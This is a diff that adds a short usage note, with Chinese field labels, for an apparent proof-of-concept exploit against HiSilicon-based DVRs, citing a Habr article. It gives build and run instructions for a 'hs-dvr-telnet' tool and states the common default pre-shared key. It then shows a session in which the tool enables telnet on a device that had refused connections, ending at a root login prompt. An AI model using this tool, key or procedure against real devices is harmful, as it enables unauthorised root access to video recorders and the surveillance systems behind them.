@@ -1,0 +1,27 @@
+验证方式：文章验证
+文章链接：https://habr.com/en/post/486856/
+影响产品：HiSilicon DVR
+用法：
+Building PoC program from source: run make in source directory.
+
+Usage: ./hs-dvr-telnet HOST PSK
+
+Most common PSK is default one: 2wj9fsa2.
+
+Example session:
+
+$ telnet 198.51.100.23
+Trying 198.51.100.23...
+telnet: Unable to connect to remote host: Connection refused
+$ ./hs-dvr-telnet 198.51.100.23 2wj9fsa2
+Sent OpenTelnet:OpenOnce command.
+randNum:46930886
+challenge=469308862wj9fsa2
+verify:OK
+Open:OK
+$ telnet 198.51.100.23
+Trying 198.51.100.23...
+Connected to 198.51.100.23.
+Escape character is '^]'.
+LocalHost login: root
+Password:
